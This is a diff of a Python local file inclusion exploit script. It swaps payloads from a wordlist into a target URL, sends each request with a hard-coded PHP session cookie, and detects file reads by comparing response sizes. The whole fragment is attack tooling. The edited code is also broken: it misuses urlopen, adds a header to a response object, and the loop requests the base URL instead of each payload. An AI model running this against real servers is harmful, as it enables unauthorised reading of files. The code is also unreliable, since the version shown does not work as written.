@@ -27,10 +27,11 @@ def exploit_LFI():
 
     ## Check the default page size when nothing came out of the LFI
     random = "VQ328FEBWUBFI32BUI3BBF"
-    cookie = 'PHPSESSID=df0fe3eg8lrj22r0p0m6cgnpk4'
+    cookie = b"PHPSESSID=df0fe3eg8lrj22r0p0m6cgnpk4"
     URL = args.url.replace('LFI', random)
-    page = request.get(URL,cookies={cookie})
-    #page = urlopen(URL,bytes(cookie))
+    query =  urlopen(URL,cookie)
+    query.add_header("Cookie", cookie)
+    page = urlopen(query)
     default_page = page.read()
     default_size = len(default_page)
 
@@ -39,8 +40,9 @@ def exploit_LFI():
     for line in f.readlines():
         total_length += 1
         url_var = url.replace('LFI', line)
-        #page = urlopen(url_var)
-        page = request.get(URL, cookies={cookie})
+        query = urlopen(URL, cookie)
+        query.add_header("Cookie", cookie)
+        page = urlopen(query)
         content = page.read()
         if len(content) != default_size:
             total_true +=1
